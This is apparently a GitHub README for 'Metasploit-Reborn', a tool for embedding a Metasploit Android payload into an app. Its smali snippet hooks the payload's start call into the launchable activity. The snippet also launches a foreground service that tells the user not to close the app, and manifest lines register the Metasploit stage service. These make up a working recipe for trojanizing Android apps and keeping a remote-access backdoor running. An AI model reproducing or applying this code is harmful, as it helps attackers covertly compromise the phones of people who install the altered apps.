
Metasploit-Reborn Notes :

<p align="left">
   <img src="https://raw.githubusercontent.com/blastlaboratory/Metasploit-Reborn/main/photo_2021-05-22_18-21-23.jpg" width=750px height=1000px>
</p>
<p align="left">
   <img src="https://raw.githubusercontent.com/blastlaboratory/Metasploit-Reborn/main/photo_2021-05-22_18-22-40.jpg" width=750px height=500px>
</p>

### Video Tutorial :
                                                      Metasploit-Reborn in Action
      
<b>      
   
https://user-images.githubusercontent.com/46685308/120068977-fb660680-c0a0-11eb-8590-e414eda0ce91.mp4
   
</b> 
         

                                                       Hook Point 

At Launchable Activity

```
invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V	
new-instance v0, Landroid/content/Intent;
const-class v1, Lcom/example/swagkarna/ForegroundService;
invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
.local v0, "serviceIntent":Landroid/content/Intent;
const-string v1, "inputExtra"
const-string v2, "Warning!!!.Dont Close This App"
invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;
invoke-static {p0, v0}, Landroidx/core/content/ContextCompat;->startForegroundService(Landroid/content/Context;Landroid/content/Intent;)V

``` 

At Manifest Level  :

```
Add Permission
<uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
----------------------------------------------------------------------------------------------------------------------------------------
<service android:enabled="true" android:exported="true" android:name="com.example.swagkarna.ForegroundService"/>
<service android:enabled="true" android:exported="true" android:name="com.metasploit.stage.MainService"/>		
```
-------------------------------------------------------------------------------------------------------------------------------------------------------------


<h1>I Love Kali-Linux + Metasploit + Android and Hande-Ercel</h1>
